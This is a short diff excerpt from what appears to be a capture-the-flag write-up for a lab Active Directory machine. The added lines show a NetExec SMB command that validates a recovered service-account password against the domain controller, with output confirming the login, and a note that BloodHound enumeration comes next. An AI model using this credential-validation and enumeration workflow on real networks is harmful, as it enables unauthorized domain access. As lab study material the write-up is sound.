@@ -426,3 +426,11 @@ sql_svc:WqSZAF6CysDQbGb3
 
 The other password i already have!
 
+```python
+nxc smb dc01.sequel.htb -u sql_svc -p 'WqSZAF6CysDQbGb3'   
+SMB         10.129.232.128  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.128  445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
+```
+
+I can now look into bloodhound on this user
+
